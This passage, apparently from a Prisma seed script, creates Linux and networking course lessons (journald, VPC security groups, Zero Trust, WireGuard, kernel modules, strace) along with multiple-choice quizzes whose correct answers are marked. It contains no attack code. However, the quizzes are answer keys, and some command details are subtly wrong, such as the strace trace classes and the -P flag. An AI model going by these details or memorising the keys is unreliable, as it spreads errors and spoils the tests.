### Learning Objectives
- Understand the role of systemd-journald as the centralized logging system in modern Linux
- Query, filter, and analyze system logs using journalctl
- Configure journald for persistent storage, size limits, and forward-to-syslog
- Set up log rotation and retention policies for compliance and disk space management
- Aggregate logs from multiple servers using rsyslog and centralized logging

### systemd-journald Overview

systemd-journald is the systemd logging daemon that collects and stores log data from all system services, the kernel, and early boot processes. It replaces the traditional syslog daemon as the primary log source.

journald advantages over traditional syslog:
- Binary format with indexed fields for fast queries
- Structured metadata (PID, UID, service name, priority)
- Automatic log rotation based on disk usage and time
- Integration with systemd services for contextual logging
- Support for real-time log following and filtering

### Querying Logs with journalctl

journalctl is the command-line tool for querying journald logs:

\`\`\`bash
# View all logs
journalctl

# Follow logs in real-time (like tail -f)
journalctl -f

# Show logs since last boot
journalctl -b

# Show logs from a specific service
journalctl -u nginx.service

# Show logs with a specific priority (error and above)
journalctl -p err

# Show logs from a specific time range
journalctl --since "2024-01-01 10:00:00" --until "2024-01-01 12:00:00"

# Show logs from the previous boot
journalctl -b -1

# Show kernel messages only
journalctl -k

# Show logs with JSON output for parsing
journalctl -o json-pretty

# Show disk usage of journal logs
journalctl --disk-usage

# Vacate old journal data
journalctl --vacuum-size=500M
journalctl --vacuum-time=30d
\`\`\`

### Filtering and Advanced Queries

journald supports field-based filtering:

\`\`\`bash
# Filter by service
journalctl _SYSTEMD_UNIT=nginx.service

# Filter by process ID
journalctl _PID=1234

# Filter by user
journalctl _UID=1000

# Filter by priority
journalctl PRIORITY=0        # emergency
journalctl PRIORITY=3        # error

# Combine filters
journalctl _SYSTEMD_UNIT=sshd.service PRIORITY=4

# Grep for specific text in logs
journalctl | grep -i "failed"

# Show only the last N lines
journalctl -n 100
\`\`\`

### Configuring journald

The journald configuration file is \`/etc/systemd/journald.conf\`:

\`\`\`ini
[Journal]
Storage=persistent
SystemMaxUse=1G
SystemKeepFree=2G
MaxRetentionSec=3month
MaxFileSec=1day
ForwardToSyslog=yes
Compress=yes
Seal=yes
\`\`\`

Key settings:
- **Storage=persistent**: Store logs in /var/log/journal/ (survives reboots)
- **SystemMaxUse**: Maximum disk space for journal logs
- **MaxRetentionSec**: How long to keep log entries
- **ForwardToSyslog=yes**: Forward logs to traditional syslog for compatibility

### Log Rotation

Traditional log rotation uses logrotate, which works alongside journald:

\`\`\`
/var/log/myapp/*.log {
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    create 0640 appuser appgroup
    postrotate
        systemctl reload myapp.service
    endscript
}
\`\`\`

### Centralized Logging

For multi-server environments, aggregate logs centrally:

1. **rsyslog Forwarding**: Configure rsyslog on each server to forward logs to a central rsyslog server
2. **ELK Stack**: Elasticsearch, Logstash, and Kibana for searching and visualizing logs
3. **Loki**: Grafana Loki for lightweight log aggregation
4. **Fluentd/Fluent Bit**: Log collectors that aggregate and forward logs to various backends

### Security Considerations

- **Log Integrity**: Use systemd-journald's Seal option with ForwardSecrecy to prevent log tampering
- **Access Control**: Restrict log access using MaxLevelStore and MaxLevelSyslog
- **Sensitive Data**: Never log passwords, tokens, or PII. Configure applications to redact sensitive values
- **Log Forwarding**: Use TLS when forwarding logs to remote servers

### Hands-On Practice

1. **Journal Queries**: Use journalctl to find all SSH login attempts from the last 24 hours, filter by priority, and identify any failed attempts.
2. **journald Configuration**: Configure journald for persistent storage with a 500MB size limit and 30-day retention.
3. **Centralized Logging**: Set up rsyslog to forward logs from two test servers to a central server.

### Key Takeaways
- journald is the centralized logging system for systemd-based Linux distributions
- journalctl provides powerful filtering by service, priority, time range, and custom fields
- Configure persistent storage and size limits to prevent disk exhaustion
- Use structured logging and avoid sensitive data in log output
- Centralize logs from multiple servers for effective monitoring and compliance

### References & Further Reading
- systemd.journal(7) man page: https://www.freedesktop.org/software/systemd/man/systemd.journal-fields.html
- journalctl(1) man page: https://www.freedesktop.org/software/systemd/man/journalctl.html
- Red Hat Logging Guide: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/monitoring_logging_and_managing_system_status/`,
      },
    });

    await createQuizWithQuestions(prisma, linuxL3.id, [
      {
        text: "What is the default storage behavior of systemd-journald?",
        answers: [
          { text: "Always persistent", isCorrect: false },
          { text: "Auto: persistent if /var/log/journal/ exists, volatile otherwise", isCorrect: true },
          { text: "Always volatile (in-memory only)", isCorrect: false },
          { text: "Always stored in /tmp", isCorrect: false },
        ],
      },
      {
        text: "Which journalctl option shows logs from the previous boot?",
        answers: [
          { text: "journalctl -b -1", isCorrect: true },
          { text: "journalctl --previous", isCorrect: false },
          { text: "journalctl --last-boot", isCorrect: false },
          { text: "journalctl -p previous", isCorrect: false },
        ],
      },
      {
        text: "How do you limit journal disk usage to 500MB?",
        answers: [
          { text: "journalctl --vacuum-size=500M", isCorrect: true },
          { text: "journalctl --max-size=500M", isCorrect: false },
          { text: "journalctl --limit=500M", isCorrect: false },
          { text: "journalctl --truncate=500M", isCorrect: false },
        ],
      },
      {
        text: "What does the ForwardToSyslog=journald.conf option do?",
        answers: [
          { text: "Disables journald logging", isCorrect: false },
          { text: "Forwards logs to traditional syslog for compatibility", isCorrect: true },
          { text: "Sends logs to a remote server", isCorrect: false },
          { text: "Enables encrypted log forwarding", isCorrect: false },
        ],
      },
    ]);

  }

  // ====================================================================
  // 5. Networking & Security
  // ====================================================================
  if (netCourse) {
    const netSec5 = await prisma.section.create({
      data: { courseId: netCourse.id, title: "5. Cloud Networking & Zero Trust", order: 5 },
    });

    const netL1 = await prisma.lesson.create({
      data: {
        sectionId: netSec5.id,
        title: "VPC Design & Security Groups",
        order: 1,
        content: `# VPC Design & Security Groups

### Learning Objectives
- Design a secure Virtual Private Cloud (VPC) architecture with proper subnet segmentation
- Configure security groups and network access control lists (NACLs) following the principle of least privilege
- Implement public and private subnets for different workload tiers
- Understand the shared responsibility model for cloud network security
- Set up VPC peering, endpoints, and transit gateways for multi-VPC architectures

### What Is a VPC?

A Virtual Private Cloud (VPC) is a logically isolated section of a cloud provider's network where you can launch resources in a virtual network you define. A VPC provides:

- **Isolation**: Your VPC is isolated from other customers' VPCs by default
- **Control**: You define IP address ranges, subnets, route tables, and gateways
- **Security**: Security groups and NACLs control traffic at multiple layers
- **Connectivity**: VPN, peering, and transit gateways connect VPCs to each other and to on-premises networks

### VPC Design Principles

A well-designed VPC follows these principles:

**1. Multi-AZ Deployment**: Deploy resources across multiple Availability Zones (AZs) for high availability. Each AZ is an isolated data center with independent power, networking, and cooling.

**2. Public/Private Subnet Separation**: Place internet-facing resources (load balancers, bastion hosts) in public subnets and backend resources (databases, application servers) in private subnets.

**3. Tiered Architecture**: Separate your network into tiers:
- **Presentation Tier**: Web servers and load balancers in public subnets
- **Application Tier**: Application servers in private subnets
- **Data Tier**: Databases in isolated private subnets with no internet access

**4. CIDR Planning**: Plan your IP address space carefully. Use /24 subnets (256 IPs) as a baseline and avoid overlapping CIDR ranges to simplify peering.

### Security Groups vs NACLs

**Security Groups** operate at the instance level:
- Stateful: Return traffic is automatically allowed
- Allow rules only (no deny rules)
- Evaluate all rules before deciding
- Apply to instances associated with the security group

**NACLs** operate at the subnet level:
- Stateless: Return traffic must be explicitly allowed
- Support both allow and deny rules
- Rules processed in order (lower numbers first)
- Apply to all instances in the subnet

**Best Practice**: Use security groups as your primary firewall mechanism. Use NACLs as an additional layer for subnet-level restrictions.

### Configuring Security Groups

Follow the principle of least privilege:

\`\`\`bash
# Create a security group for web servers
aws ec2 create-security-group \
  --group-name web-server-sg \
  --description "Web Server Security Group" \
  --vpc-id vpc-12345678

# Allow HTTPS from anywhere
aws ec2 authorize-security-group-ingress \
  --group-id sg-web123 \
  --protocol tcp \
  --port 443 \
  --cidr 0.0.0.0/0

# Allow SSH only from bastion host security group
aws ec2 authorize-security-group-ingress \
  --group-id sg-web123 \
  --protocol tcp \
  --port 22 \
  --source-group sg-bastion
\`\`\`

### VPC Endpoints

VPC endpoints allow you to access AWS services without traversing the public internet:

- **Gateway Endpoints**: For S3 and DynamoDB (free, high bandwidth)
- **Interface Endpoints**: For other AWS services (powered by PrivateLink)
- **Gateway Load Balancer Endpoints**: For third-party virtual appliances

Always use VPC endpoints for cloud service access to reduce internet exposure and improve latency.

### Network Monitoring

Monitor VPC traffic using:
- **VPC Flow Logs**: Capture IP traffic metadata for all network interfaces
- **CloudWatch Metrics**: Monitor network throughput, packet drops, and connection counts
- **AWS Network Firewall**: Managed intrusion prevention for VPC traffic
- **GuardDuty**: Threat detection analyzing VPC Flow Logs for anomalies

### Hands-On Practice

1. **VPC Design**: Design a three-tier VPC architecture with public, application, and data subnets across three AZs. Document the CIDR ranges, subnet allocations, and route table configurations.
2. **Security Group Configuration**: Create security groups for each tier with least-privilege rules. The web tier should allow HTTPS from the internet and SSH from the bastion. The app tier should allow traffic only from the web tier.
3. **VPC Flow Log Analysis**: Enable VPC Flow Logs and use CloudWatch Insights to query the logs. Identify all outbound connections from your VPC to IP addresses outside your expected ranges.

### Key Takeaways
- Design VPCs with multi-AZ deployment, public/private subnet separation, and tiered architecture
- Security groups are stateful instance-level firewalls; NACLs are stateless subnet-level firewalls
- Follow the principle of least privilege: allow only necessary traffic between tiers
- Use VPC endpoints to avoid routing cloud service traffic through the internet
- Monitor network traffic with VPC Flow Logs and threat detection services

### References & Further Reading
- AWS VPC User Guide: https://docs.aws.amazon.com/vpc/latest/userguide/
- AWS Security Groups Best Practices: https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html
- GCP VPC Documentation: https://cloud.google.com/vpc/docs`,
      },
    });

    await createQuizWithQuestions(prisma, netL1.id, [
      {
        text: "What is the main difference between security groups and NACLs?",
        answers: [
          { text: "Security groups are stateless, NACLs are stateful", isCorrect: false },
          { text: "Security groups are stateful instance-level firewalls, NACLs are stateless subnet-level firewalls", isCorrect: true },
          { text: "Security groups only allow inbound traffic, NACLs only allow outbound", isCorrect: false },
          { text: "There is no difference between them", isCorrect: false },
        ],
      },
      {
        text: "In a three-tier VPC architecture, where should databases be placed?",
        answers: [
          { text: "Public subnets with internet access", isCorrect: false },
          { text: "Private subnets with no internet access", isCorrect: true },
          { text: "In the DMZ", isCorrect: false },
          { text: "In a separate VPC", isCorrect: false },
        ],
      },
      {
        text: "What do VPC Flow Logs capture?",
        answers: [
          { text: "Full packet content of all network traffic", isCorrect: false },
          { text: "IP traffic metadata for all network interfaces", isCorrect: true },
          { text: "Application-layer data", isCorrect: false },
          { text: "DNS query logs only", isCorrect: false },
        ],
      },
      {
        text: "Which AWS service provides threat detection by analyzing VPC Flow Logs?",
        answers: [
          { text: "CloudWatch", isCorrect: false },
          { text: "GuardDuty", isCorrect: true },
          { text: "Config", isCorrect: false },
          { text: "CloudTrail", isCorrect: false },
        ],
      },
    ]);

    const netL2 = await prisma.lesson.create({
      data: {
        sectionId: netSec5.id,
        title: "Zero Trust Architecture",
        order: 2,
        content: `# Zero Trust Architecture

### Learning Objectives
- Understand the principles of Zero Trust and why traditional perimeter-based security is insufficient
- Implement the core Zero Trust pillars: identity verification, least privilege, micro-segmentation, and continuous monitoring
- Design a Zero Trust network architecture for cloud and hybrid environments
- Understand Zero Trust Network Access (ZTNA) as a replacement for VPN
- Apply Zero Trust principles to application architecture and data access

### The Death of the Perimeter

Traditional network security relied on a castle-and-moat model: everything inside the corporate network was trusted, and everything outside was untrusted. This model fails because:

- **Remote Work**: Employees access resources from home, cafes, and hotels
- **Cloud Migration**: Resources are distributed across cloud providers and SaaS applications
- **BYOD**: Personal devices access corporate resources
- **Lateral Movement**: Once an attacker breaches the perimeter, they can move freely inside
- **Insider Threats**: The threat comes from within the trusted network

Zero Trust eliminates the concept of a trusted network. Every request is verified regardless of origin.

### Zero Trust Principles

The three foundational principles of Zero Trust:

**1. Verify Explicitly**: Always authenticate and authorize based on all available data points including user identity, device health, location, service, data classification, and anomalies.

**2. Use Least Privilege Access**: Limit user access with just-in-time and just-enough-access (JIT/JEA), risk-based adaptive policies, and data protection to secure both data and productivity.

**3. Assume Breach**: Minimize the blast radius and segment access. Verify end-to-end encryption. Use analytics to get visibility, drive threat detection, and improve defenses.

### The Five Pillars of Zero Trust

**Identity**: Strong authentication for every user. Implement multi-factor authentication (MFA), single sign-on (SSO), and conditional access policies based on user risk level.

**Devices**: Assess device health before granting access. Check patch level, antivirus status, disk encryption, and certificate validity.

**Network**: Micro-segment the network into granular zones. Encrypt all traffic, even internal. Use software-defined perimeters.

**Applications**: Secure the application layer with API gateways, input validation, and runtime protection.

**Data**: Classify data by sensitivity and apply protection policies. Encrypt data at rest and in transit. Implement data loss prevention (DLP).

### Zero Trust Network Access (ZTNA)

ZTNA replaces traditional VPN by providing:
- Per-application access instead of full network access
- Identity-based authentication for every connection
- Device posture checks before granting access
- Encrypted tunnels that terminate at the application, not the network edge
- Session recording and audit logging

ZTNA solutions include Cloudflare Access, Zscaler Private Access, and AWS Verified Access.

### Implementing Zero Trust

Start with the highest-risk areas:
1. **Identity First**: Deploy MFA for all users and SSO for all applications
2. **Device Trust**: Implement device certificates and health checks
3. **Network Micro-Segmentation**: Segment the network into application-specific zones
4. **Data Classification**: Identify and protect sensitive data
5. **Continuous Monitoring**: Deploy SIEM and SOAR for real-time threat detection

### Hands-On Practice

1. **Identity Verification**: Set up a Zero Trust identity pipeline that requires MFA, device certificate validation, and conditional access before granting access to an application.
2. **Micro-Segmentation**: Design a micro-segmented network for a three-tier application where each tier can only communicate with adjacent tiers on specific ports.
3. **ZTNA Implementation**: Configure Cloudflare Access to protect an internal application with authentication and device checks.

### Key Takeaways
- Zero Trust eliminates implicit trust based on network location
- The three core principles: verify explicitly, least privilege, assume breach
- Five pillars: identity, devices, network, applications, data
- ZTNA replaces VPN with per-application, identity-based access
- Implement Zero Trust incrementally, starting with identity and MFA

### References & Further Reading
- NIST SP 800-207 Zero Trust Architecture: https://csrc.nist.gov/pubs/sp/800/207/final
- Forrester Zero Trust Framework: https://www.forrester.com/zero-trust/
- Microsoft Zero Trust Guide: https://docs.microsoft.com/en-us/security/zero-trust/`,
      },
    });

    await createQuizWithQuestions(prisma, netL2.id, [
      {
        text: "What are the three foundational principles of Zero Trust?",
        answers: [
          { text: "Encrypt, authenticate, authorize", isCorrect: false },
          { text: "Verify explicitly, use least privilege access, assume breach", isCorrect: true },
          { text: "Isolate, segment, monitor", isCorrect: false },
          { text: "Authenticate, authorize, audit", isCorrect: false },
        ],
      },
      {
        text: "How does ZTNA differ from traditional VPN?",
        answers: [
          { text: "ZTNA provides full network access, VPN provides application access", isCorrect: false },
          { text: "ZTNA provides per-application, identity-based access instead of full network access", isCorrect: true },
          { text: "ZTNA does not require authentication", isCorrect: false },
          { text: "ZTNA is slower than VPN", isCorrect: false },
        ],
      },
      {
        text: "Why does the traditional perimeter security model fail?",
        answers: [
          { text: "Firewalls are too expensive", isCorrect: false },
          { text: "Remote work, cloud migration, and BYOD eliminate the trusted perimeter", isCorrect: true },
          { text: "Perimeters cannot be configured", isCorrect: false },
          { text: "Only small companies need perimeters", isCorrect: false },
        ],
      },
      {
        text: "Which Zero Trust pillar should be implemented first?",
        answers: [
          { text: "Network micro-segmentation", isCorrect: false },
          { text: "Data classification", isCorrect: false },
          { text: "Identity and MFA", isCorrect: true },
          { text: "Device health checks", isCorrect: false },
        ],
      },
    ]);

    const netL3 = await prisma.lesson.create({
      data: {
        sectionId: netSec5.id,
        title: "WireGuard & Modern VPN",
        order: 3,
        content: `# WireGuard & Modern VPN

### Learning Objectives
- Understand the WireGuard protocol and why it is considered a next-generation VPN solution
- Configure WireGuard for site-to-site and client-to-site VPN connections
- Compare WireGuard with traditional VPN protocols (OpenVPN, IPSec) in terms of performance, security, and simplicity
- Implement WireGuard with proper key management and access control
- Understand the limitations of WireGuard and when to choose alternative solutions

### What Is WireGuard?

WireGuard is a modern, lightweight VPN protocol that uses state-of-the-art cryptography. It is designed to be simpler, faster, and more secure than traditional VPN protocols like OpenVPN and IPSec.

Key advantages over traditional VPN:
- **Small Codebase**: Approximately 4,000 lines of code compared to OpenVPN's 100,000+ and IPSec's 400,000+
- **Performance**: Uses ChaCha20 for encryption, which is faster than AES on devices without hardware AES support
- **Speed**: Faster connection establishment (1-2 round trips) compared to OpenVPN (10+ round trips)
- **Roaming**: Natively supports client IP address changes without reconnection
- **Modern Cryptography**: Uses Curve25519 for key exchange, BLAKE2s for hashing, and SipHash24 for hashtable keys

### WireGuard Architecture

WireGuard operates at Layer 3 (network layer) and creates a virtual network interface (wg0). It uses:

- **Public/Private Key Pairs**: Each peer has a static public/private key pair
- **Tunnel IP Addresses**: Each peer is assigned a virtual IP address within the tunnel
- **Allowed IPs**: Defines which IP ranges are routed through the tunnel
- **Endpoint**: The public IP:port of the peer (for NAT traversal)

### Configuring WireGuard

**Server Configuration** (/etc/wireguard/wg0.conf):

\`\`\`ini
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <server-private-key>
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Client 1
[Peer]
PublicKey = <client1-public-key>
AllowedIPs = 10.0.0.2/32

# Client 2
[Peer]
PublicKey = <client2-public-key>
AllowedIPs = 10.0.0.3/32
\`\`\`

**Client Configuration**:

\`\`\`ini
[Interface]
Address = 10.0.0.2/24
PrivateKey = <client-private-key>
DNS = 1.1.1.1

[Peer]
PublicKey = <server-public-key>
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
\`\`\`

### Key Management

WireGuard keys are generated and managed as follows:

\`\`\`bash
# Generate a key pair
wg genkey | tee privatekey | wg pubkey > publickey

# Generate a preshared key for additional security
wg genpsk

# Show current WireGuard status
wg show

# Show interface statistics
wg show wg0 transfer
\`\`\`

For production environments, use a key management system (KMS) to rotate keys periodically.

### Performance Comparison

| Feature | WireGuard | OpenVPN | IPSec |
|---------|-----------|---------|-------|
| Codebase Size | ~4,000 lines | ~100,000 lines | ~400,000 lines |
| Handshake Speed | 1-2 round trips | 10+ round trips | 6-8 round trips |
| Encryption | ChaCha20 | AES-256-CBC | AES-256-GCM |
| Key Exchange | Curve25519 | RSA/ECDH | DH/ECDH |
| NAT Traversal | Built-in | Requires config | Requires NAT-T |
| Roaming | Native | Requires reconnect | Requires reconnect |

### Limitations

WireGuard is not a complete VPN solution for all scenarios:
- **No User Authentication**: WireGuard authenticates by public key only; it does not support username/password. Pair with an identity provider for user-based access control.
- **No Encryption at Rest**: WireGuard encrypts traffic in transit but does not protect stored configuration files.
- **UDP Only**: WireGuard uses UDP, which some firewalls block.
- **No Built-in Kill Switch**: Configure firewall rules separately to prevent traffic leaks.

### Hands-On Practice

1. **WireGuard Setup**: Install WireGuard on two Linux servers and configure a site-to-site VPN tunnel. Verify connectivity by pinging between the servers.
2. **Client Configuration**: Set up a WireGuard client configuration for remote access. Connect to the VPN and verify that all traffic is routed through the tunnel.
3. **Performance Testing**: Use iperf3 to measure the throughput of a WireGuard tunnel compared to an OpenVPN tunnel between the same two servers.

### Key Takeaways
- WireGuard is a modern VPN protocol with a small codebase, fast performance, and strong cryptography
- It uses public/private key pairs for authentication and supports native roaming
- WireGuard is simpler and faster than OpenVPN and IPSec but lacks user-based authentication
- Key management is critical; use a KMS for production key rotation
- WireGuard is ideal for site-to-site tunnels and client-to-site VPN; pair with an identity provider

### References & Further Reading
- WireGuard Official Documentation: https://www.wireguard.com/
- WireGuard Quick Start: https://www.wireguard.com/quickstart/
- WireGuard Performance Benchmarks: https://www.wireguard.com/performance/`,
      },
    });

    await createQuizWithQuestions(prisma, netL3.id, [
      {
        text: "Approximately how many lines of code does WireGuard have?",
        answers: [
          { text: "100,000", isCorrect: false },
          { text: "400,000", isCorrect: false },
          { text: "4,000", isCorrect: true },
          { text: "40,000", isCorrect: false },
        ],
      },
      {
        text: "What is WireGuard's primary authentication mechanism?",
        answers: [
          { text: "Username and password", isCorrect: false },
          { text: "Public/private key pairs", isCorrect: true },
          { text: "Certificate-based authentication", isCorrect: false },
          { text: "Biometric verification", isCorrect: false },
        ],
      },
      {
        text: "Which encryption algorithm does WireGuard use?",
        answers: [
          { text: "AES-256-CBC", isCorrect: false },
          { text: "RSA-4096", isCorrect: false },
          { text: "ChaCha20", isCorrect: true },
          { text: "Blowfish", isCorrect: false },
        ],
      },
      {
        text: "What is a key limitation of WireGuard that requires pairing with another solution?",
        answers: [
          { text: "It does not support UDP", isCorrect: false },
          { text: "It does not support user-based authentication natively", isCorrect: true },
          { text: "It cannot encrypt traffic", isCorrect: false },
          { text: "It only works on Linux", isCorrect: false },
        ],
      },
    ]);

  }

  // ====================================================================
  // 6. Linux Kernel & System Internals
  // ====================================================================
  if (kernelCourse) {
    const kernelSec3 = await prisma.section.create({
      data: { courseId: kernelCourse.id, title: "3. Kernel Modules & System Calls", order: 3 },
    });

    const kernelL1 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec3.id,
        title: "Writing Kernel Modules",
        order: 1,
        content: `# Writing Kernel Modules

### Learning Objectives
- Understand the architecture of kernel modules and how they extend Linux kernel functionality
- Write, compile, load, and unload a basic kernel module
- Understand the kernel API for memory allocation, process management, and interrupt handling
- Implement proper error handling and resource cleanup in kernel code
- Recognize the security implications of running code in kernel space

### What Are Kernel Modules?

Kernel modules are pieces of code that can be loaded into the Linux kernel at runtime without requiring a system reboot. They extend kernel functionality by adding:

- **Device drivers**: Hardware support for new devices
- **File systems**: Support for new filesystem types (NTFS, Btrfs)
- **System calls**: New interfaces for user-space applications
- **Network filters**: Packet filtering and firewall rules
- **Security modules**: SELinux, AppArmor policies

Modules are loaded with \`insmod\` and removed with \`rmmod\`. The \`modprobe\` command handles dependency resolution automatically.

### The Anatomy of a Kernel Module

A minimal kernel module:

\`\`\`c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Researcher");
MODULE_DESCRIPTION("A simple kernel module");

static int __init hello_init(void) {
    printk(KERN_INFO "Hello, kernel world!\n");
    return 0;  // 0 = success, negative = error
}

static void __exit hello_exit(void) {
    printk(KERN_INFO "Goodbye, kernel world!\n");
}

module_init(hello_init);
module_exit(hello_exit);
\`\`\`

Key concepts:
- \`module_init()\`: Registers the function called when the module is loaded
- \`module_exit()\`: Registers the function called when the module is unloaded
- \`printk()\`: Kernel-space logging function (equivalent to printf)
- \`KERN_INFO\`: Log priority level

### Kernel Module Compilation

Create a Makefile:

\`\`\`makefile
obj-m += hello.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
\`\`\`

Build and load:

\`\`\`bash
# Compile the module
make

# Load the module (requires root)
sudo insmod hello.ko

# Check kernel log for output
dmesg | tail -5

# List loaded modules
lsmod | grep hello

# Unload the module
sudo rmmod hello

# Check unload message
dmesg | tail -5
\`\`\`

### Kernel Memory Management

Kernel memory management is fundamentally different from user-space:

- **kmalloc/kfree**: Allocate and free kernel memory (analogous to malloc/free)
- **vmalloc/vfree**: Allocate virtually contiguous memory for large buffers
- **kzalloc**: Allocates zeroed memory (prevents information leaks)
- **GFP flags**: Control allocation behavior (GFP_KERNEL for sleeping, GFP_ATOMIC for interrupt context)

\`\`\`c
// Allocate zeroed kernel memory
char *buf = kzalloc(1024, GFP_KERNEL);
if (!buf)
    return -ENOMEM;

// Use the buffer...
kfree(buf);
\`\`\`

### Debugging Kernel Modules

Debugging kernel code is fundamentally different from user-space:

- **printk**: The primary debugging tool. Logs to the kernel ring buffer (dmesg)
- **/proc filesystem**: Expose module data through proc entries for inspection
- **ftrace**: Function tracing framework for kernel functions
- **kprobes**: Dynamic instrumentation for breaking into kernel functions
- **GDB with KGDB**: Remote debugging of kernel code over a serial connection

### Security Implications

Running code in kernel space grants the highest possible privileges:

- **Kernel modules have unrestricted access** to all memory, hardware, and CPU resources
- **A bug in a kernel module can crash the entire system** (kernel panic)
- **Malicious kernel modules (rootkits)** can hide processes, files, and network connections
- **Secure Boot** prevents loading unsigned kernel modules
- **Module signing**: The kernel can require all modules to be signed with a trusted key

### Hands-On Practice

1. **Basic Module**: Write, compile, and load a kernel module that prints "Hello from kernel space!" to the kernel log.
2. **Proc Entry Module**: Write a kernel module that creates a /proc entry displaying the current system uptime in jiffies.
3. **Module Parameters**: Modify your module to accept a parameter (e.g., message="Custom message") and pass it during insmod.

### Key Takeaways
- Kernel modules extend the kernel at runtime without rebooting
- Modules run in the highest privilege context; bugs can crash the entire system
- Use printk for debugging, kmalloc/kfree for memory, and module_init/module_exit for lifecycle
- Secure Boot and module signing prevent unauthorized kernel code from loading
- Always handle errors and clean up resources in kernel modules

### References & Further Reading
- Linux Kernel Module Programming Guide: https://tldp.org/LDP/lkmpg/2.6/html/
- Linux Kernel Newbies: https://kernelnewbies.org/
- LWN Kernel Development: https://lwn.net/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL1.id, [
      {
        text: "What command is used to load a kernel module?",
        answers: [
          { text: "modprobe", isCorrect: false },
          { text: "insmod", isCorrect: true },
          { text: "loadmod", isCorrect: false },
          { text: "kmod", isCorrect: false },
        ],
      },
      {
        text: "What is the difference between insmod and modprobe?",
        answers: [
          { text: "insmod loads from source, modprobe loads from binary", isCorrect: false },
          { text: "modprobe handles dependency resolution, insmod does not", isCorrect: true },
          { text: "insmod is for user-space modules, modprobe is for kernel modules", isCorrect: false },
          { text: "There is no difference", isCorrect: false },
        ],
      },
      {
        text: "Why should Secure Boot be enabled when running kernel modules?",
        answers: [
          { text: "It makes modules load faster", isCorrect: false },
          { text: "It prevents loading unsigned (potentially malicious) kernel modules", isCorrect: true },
          { text: "It enables module debugging", isCorrect: false },
          { text: "It is required for module compilation", isCorrect: false },
        ],
      },
      {
        text: "What does kzalloc do differently from kmalloc?",
        answers: [
          { text: "kzalloc allocates memory from the slab allocator", isCorrect: false },
          { text: "kzalloc allocates zeroed memory to prevent information leaks", isCorrect: true },
          { text: "kzalloc is faster than kmalloc", isCorrect: false },
          { text: "kzalloc allocates virtual memory, kmalloc allocates physical", isCorrect: false },
        ],
      },
    ]);

    const kernelL2 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec3.id,
        title: "System Call Tracing with strace",
        order: 2,
        content: `# System Call Tracing with strace

### Learning Objectives
- Understand what system calls are and how they provide the interface between user-space and kernel-space
- Use strace to trace system calls made by programs and diagnose issues
- Analyze strace output to understand program behavior, identify errors, and find performance bottlenecks
- Apply system call filtering and output formatting for focused analysis
- Understand the security implications of system call monitoring

### What Are System Calls?

System calls (syscalls) are the programmatic interface between user-space applications and the kernel. When a program needs to perform privileged operations (file I/O, network communication, process management), it must request the kernel to perform these operations via system calls.

The x86-64 Linux system call convention:
- System call number in the \`rax\` register
- Arguments in \`rdi\`, \`rsi\`, \`rdx\`, \`r10\`, \`r8\`, \`r9\`
- Return value in \`rax\`
- Invoked via the \`syscall\` instruction

Common system call categories:
- **File I/O**: open, read, write, close, stat, chmod
- **Process**: fork, exec, wait, exit, getpid, kill
- **Memory**: mmap, munmap, brk, mprotect
- **Network**: socket, connect, bind, listen, accept, send, recv
- **Time**: clock_gettime, nanosleep, gettimeofday

### Using strace

strace intercepts and records system calls made by a process:

\`\`\`bash
# Trace a command
strace ls -la /tmp

# Trace a running process by PID
strace -p 12345

# Follow child processes
strace -f command

# Filter by system call category
strace -e trace=file command      # File operations only
strace -e trace=network command   # Network operations only
strace -e trace=process command   # Process operations only
strace -e trace=memory command    # Memory operations only

# Show timing information
strace -T command

# Show time spent in each syscall
strace -c command

# Count syscall occurrences
strace -c -S calls command

# Output to file
strace -o output.txt command

# Show path expansions
strace -y command

# Show signal deliveries
strace -e trace=signal command
\`\`\`

### Analyzing strace Output

Each line of strace output shows:

\`\`\`
open("/etc/passwd", O_RDONLY)    = 3
\`\`\`

- \`open\`: The system call name
- \`"/etc/passwd", O_RDONLY\`: Arguments passed to the syscall
- \`=\`: Return value indicator
- \`3\`: File descriptor returned (success)
- Error: \`open("/nonexistent", O_RDONLY) = -1 ENOENT (No such file or directory)\`

### Practical Analysis Scenarios

**Finding Configuration Files**:
\`\`\`bash
strace -e trace=file -y application 2>&1 | grep -E "\.conf|\.ini|\.cfg"
\`\`\`

**Diagnosing Slow Startup**:
\`\`\`bash
strace -T -e trace=network,application command 2>&1 | sort -t= -k2 -rn | head -20
\`\`\`

**Finding Missing Libraries**:
\`\`\`bash
strace -e trace=openat command 2>&1 | grep "No such file"
\`\`\`

**Network Connection Analysis**:
\`\`\`bash
strace -e trace=connect -y command
\`\`\`

### Advanced strace Features

**Syscall Filtering with PEG**:
\`\`\`bash
strace -P open -P close command
strace -e trace=!read,!write command
\`\`\`

**Signal Tracing**:
\`\`\`bash
strace -e trace=signal -f command
\`\`\`

**File Descriptor Tracking**:
\`\`\`bash
strace -y -Z command
\`\`\`

### Security Applications of System Call Monitoring

System call monitoring is a foundation of application security:

- **Behavioral Analysis**: Detect malware by identifying unusual system call patterns
- **Sandboxing Enforcement**: seccomp filters restrict which system calls a process can make
- **Forensics**: Reconstruct program behavior by analyzing system call sequences
- **Exploit Detection**: Identify return-oriented programming (ROP) chains

### Hands-On Practice

1. **strace Basics**: Use strace to trace the system calls made by \`ls -la\`. Identify all file operations and count how many times each syscall type is called.
2. **Performance Diagnosis**: A Python script takes 10 seconds to start. Use strace with timing to identify which system call is causing the delay.
3. **Malware Analysis**: Use strace to analyze a suspicious binary. Identify all files it accesses, network connections it attempts, and processes it spawns.

### Key Takeaways
- System calls are the interface between user-space applications and the kernel
- strace intercepts and records all system calls made by a process
